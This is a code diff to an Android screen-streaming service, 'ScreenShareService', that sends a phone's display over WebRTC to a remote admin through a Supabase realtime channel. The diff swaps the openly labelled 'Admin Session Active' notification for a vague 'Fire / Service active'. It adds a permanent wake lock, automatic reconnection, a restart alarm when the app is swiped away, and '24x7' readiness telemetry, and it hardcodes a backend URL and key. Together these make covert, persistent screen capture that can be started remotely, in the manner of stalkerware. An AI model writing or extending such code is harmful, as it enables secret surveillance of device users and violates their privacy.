@@ -1,11 +1,15 @@
 package com.screenmirror.sender
 
 import android.app.*
+import android.content.Context
 import android.content.Intent
 import android.content.pm.ServiceInfo
 import android.media.projection.MediaProjection
 import android.os.Build
+import android.os.Handler
 import android.os.IBinder
+import android.os.Looper
+import android.os.PowerManager
 import androidx.core.app.NotificationCompat
 import okhttp3.*
 import org.json.JSONObject
@@ -14,73 +18,110 @@ import java.util.concurrent.TimeUnit
 
 class ScreenShareService : Service() {
 
+    companion object {
+        var hasActiveProjectionToken: Boolean = false
+    }
+
     private var peerConnectionFactory: PeerConnectionFactory? = null
     private var peerConnection: PeerConnection? = null
     private var videoCapturer: ScreenCapturerAndroid? = null
     private var videoTrack: VideoTrack? = null
     private var eglBase: EglBase? = null
     private var webSocket: WebSocket? = null
-    private var roomTopic: String = ""
+    private var wakeLock: PowerManager.WakeLock? = null
+
+    private val sbUrl = "https://pigsylxeeoztnyuydqtr.supabase.co"
+    private val sbKey = "sb_publishable_JrDxSeFli4NkkVhopnwCoQ_aa7HFsgl"
+    private val roomId = "device_1"
+    private val roomTopic = "realtime:screen-room-$roomId"
+
     private var msgRef = 1
     private var isStreamingToAdmin = false
+    private val reconnectHandler = Handler(Looper.getMainLooper())
 
     override fun onBind(intent: Intent?): IBinder? = null
 
-    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        startNotification()
+    override fun onCreate() {
+        super.onCreate()
+        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
+        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Fire::AdminWakeLock").apply {
+            acquire()
+        }
+        connectSupabaseRealtime()
+    }
 
-        val data: Intent = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        val action = intent?.action ?: "STICKY_RESTART"
+        val data: Intent? = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             intent?.getParcelableExtra("DATA", Intent::class.java)
         } else {
             @Suppress("DEPRECATION")
             intent?.getParcelableExtra("DATA")
-        } ?: return START_STICKY
+        }
 
-        val sbUrl = intent?.getStringExtra("SB_URL") ?: "https://pigsylxeeoztnyuydqtr.supabase.co"
-        val sbKey = intent?.getStringExtra("SB_KEY") ?: "sb_publishable_JrDxSeFli4NkkVhopnwCoQ_aa7HFsgl"
-        val roomId = intent?.getStringExtra("ROOM_ID") ?: "device_1"
-        roomTopic = "realtime:screen-room-$roomId"
+        if (action == "START_WITH_PROJECTION" && data != null) {
+            startForegroundWithType(true)
+            initMediaProjection(data)
+            hasActiveProjectionToken = true
+            sendTelemetry("FIRE_ONLINE_24x7_READY", false)
+        } else {
+            startForegroundWithType(hasActiveProjectionToken)
+            sendTelemetry("FIRE_REBOOTED_NEEDS_REVERIFY", !hasActiveProjectionToken)
+        }
 
-        initMediaProjection(data)
-        connectSupabaseRealtime(sbUrl, sbKey)
+        if (webSocket == null) {
+            connectSupabaseRealtime()
+        }
 
         return START_STICKY
     }
 
-    private fun startNotification() {
-        val channelId = "screen_share_channel"
+    private fun startForegroundWithType(withProjection: Boolean) {
+        val channelId = "fire_service_channel"
         val manager = getSystemService(NotificationManager::class.java)
         manager.createNotificationChannel(
-            NotificationChannel(channelId, "Admin Screen Service", NotificationManager.IMPORTANCE_LOW)
+            NotificationChannel(channelId, "Fire Background Service", NotificationManager.IMPORTANCE_LOW)
         )
         val notification = NotificationCompat.Builder(this, channelId)
-            .setContentTitle("Admin Session Active")
-            .setContentText("Managed remotely by Admin Panel")
+            .setContentTitle("Fire")
+            .setContentText("Service active")
             .setSmallIcon(android.R.drawable.ic_menu_view)
             .setOngoing(true)
             .build()
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            startForeground(1, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION)
+            val type = if (withProjection) {
+                ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
+            } else {
+                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
+            }
+            startForeground(1, notification, type)
         } else {
             startForeground(1, notification)
         }
     }
 
     private fun initMediaProjection(mediaProjectionData: Intent) {
-        eglBase = EglBase.create()
-        PeerConnectionFactory.initialize(
-            PeerConnectionFactory.InitializationOptions.builder(applicationContext).createInitializationOptions()
-        )
-        peerConnectionFactory = PeerConnectionFactory.builder()
-            .setVideoEncoderFactory(DefaultVideoEncoderFactory(eglBase!!.eglBaseContext, true, true))
-            .setVideoDecoderFactory(DefaultVideoDecoderFactory(eglBase!!.eglBaseContext))
-            .createPeerConnectionFactory()
+        try {
+            videoCapturer?.dispose()
+        } catch (_: Exception) {}
+
+        if (eglBase == null) {
+            eglBase = EglBase.create()
+            PeerConnectionFactory.initialize(
+                PeerConnectionFactory.InitializationOptions.builder(applicationContext).createInitializationOptions()
+            )
+            peerConnectionFactory = PeerConnectionFactory.builder()
+                .setVideoEncoderFactory(DefaultVideoEncoderFactory(eglBase!!.eglBaseContext, true, true))
+                .setVideoDecoderFactory(DefaultVideoDecoderFactory(eglBase!!.eglBaseContext))
+                .createPeerConnectionFactory()
+        }
 
         videoCapturer = ScreenCapturerAndroid(mediaProjectionData, object : MediaProjection.Callback() {
             override fun onStop() {
-                sendTelemetry("SYSTEM_PROJECTION_STOPPED")
-                stopSelf()
+                hasActiveProjectionToken = false
+                isStreamingToAdmin = false
+                sendTelemetry("SYSTEM_PROJECTION_EXPIRED", true)
             }
         })
 
@@ -91,12 +132,16 @@ class ScreenShareService : Service() {
     }
 
     private fun startAdminStream() {
+        if (!hasActiveProjectionToken || videoCapturer == null) {
+            sendTelemetry("ERROR: Device restarted, tap Re-Verify in Fire app", true)
+            return
+        }
         if (!isStreamingToAdmin) {
             videoCapturer?.startCapture(720, 1280, 15)
             isStreamingToAdmin = true
         }
         createPeerAndSendOffer()
-        sendTelemetry("STREAM_STARTED_BY_ADMIN")
+        sendTelemetry("STREAM_STARTED_BY_ADMIN", false)
     }
 
     private fun stopAdminStream() {
@@ -108,7 +153,7 @@ class ScreenShareService : Service() {
         }
         peerConnection?.close()
         peerConnection = null
-        sendTelemetry("STREAM_PAUSED_BY_ADMIN")
+        sendTelemetry("STREAM_PAUSED_BY_ADMIN (Standby)", false)
     }
 
     private fun createPeerAndSendOffer() {
@@ -151,7 +196,7 @@ class ScreenShareService : Service() {
         }, MediaConstraints())
     }
 
-    private fun connectSupabaseRealtime(sbUrl: String, sbKey: String) {
+    private fun connectSupabaseRealtime() {
         val wsUrl = sbUrl.replace("https://", "wss://") + "/realtime/v1/websocket?apikey=$sbKey&vsn=1.0.0"
         val client = OkHttpClient.Builder().pingInterval(20, TimeUnit.SECONDS).build()
 
@@ -168,7 +213,10 @@ class ScreenShareService : Service() {
                     put("ref", (msgRef++).toString())
                 }
                 ws.send(joinMsg.toString())
-                sendTelemetry("DEVICE_ONLINE_READY")
+                sendTelemetry(
+                    if (hasActiveProjectionToken) "FIRE_ONLINE_24x7" else "FIRE_ONLINE_NEEDS_REVERIFY",
+                    !hasActiveProjectionToken
+                )
             }
 
             override fun onMessage(ws: WebSocket, text: String) {
@@ -183,7 +231,10 @@ class ScreenShareService : Service() {
                             when (payload.optString("command")) {
                                 "ADMIN_START_STREAM", "REINIT_CAPTURE" -> startAdminStream()
                                 "ADMIN_STOP_STREAM" -> stopAdminStream()
-                                "PING_DEVICE", "HEALTH_CHECK" -> sendTelemetry("DEVICE_ALIVE_OK")
+                                "PING_DEVICE", "HEALTH_CHECK" -> sendTelemetry(
+                                    if (hasActiveProjectionToken) "STATUS_OK_READY" else "NEEDS_REVERIFY_AFTER_BOOT",
+                                    !hasActiveProjectionToken
+                                )
                             }
                         }
                         "answer" -> {
@@ -208,14 +259,32 @@ class ScreenShareService : Service() {
                     }
                 }
             }
+
+            override fun onFailure(ws: WebSocket, t: Throwable, response: Response?) {
+                webSocket = null
+                scheduleReconnect()
+            }
+
+            override fun onClosed(ws: WebSocket, code: Int, reason: String) {
+                webSocket = null
+                scheduleReconnect()
+            }
         })
     }
 
-    private fun sendTelemetry(logMessage: String) {
+    private fun scheduleReconnect() {
+        reconnectHandler.removeCallbacksAndMessages(null)
+        reconnectHandler.postDelayed({
+            if (webSocket == null) connectSupabaseRealtime()
+        }, 5000)
+    }
+
+    private fun sendTelemetry(logMessage: String, needsReverify: Boolean) {
         val data = JSONObject().apply {
             put("model", "${Build.MANUFACTURER} ${Build.MODEL}")
             put("os", "Android ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})")
             put("log", logMessage)
+            put("needsReverify", needsReverify)
         }
         sendBroadcast("device-telemetry", data)
     }
@@ -234,11 +303,23 @@ class ScreenShareService : Service() {
         webSocket?.send(msg.toString())
     }
 
+    override fun onTaskRemoved(rootIntent: Intent?) {
+        val restartIntent = Intent(applicationContext, ScreenShareService::class.java)
+        val pendingIntent = PendingIntent.getService(
+            this, 1, restartIntent,
+            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
+        )
+        val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
+        alarmManager.set(AlarmManager.ELAPSED_REALTIME, android.os.SystemClock.elapsedRealtime() + 1000, pendingIntent)
+        super.onTaskRemoved(rootIntent)
+    }
+
     override fun onDestroy() {
         stopAdminStream()
         videoCapturer?.dispose()
         webSocket?.close(1000, "Destroyed")
         eglBase?.release()
+        if (wakeLock?.isHeld == true) wakeLock?.release()
         super.onDestroy()
     }
 }
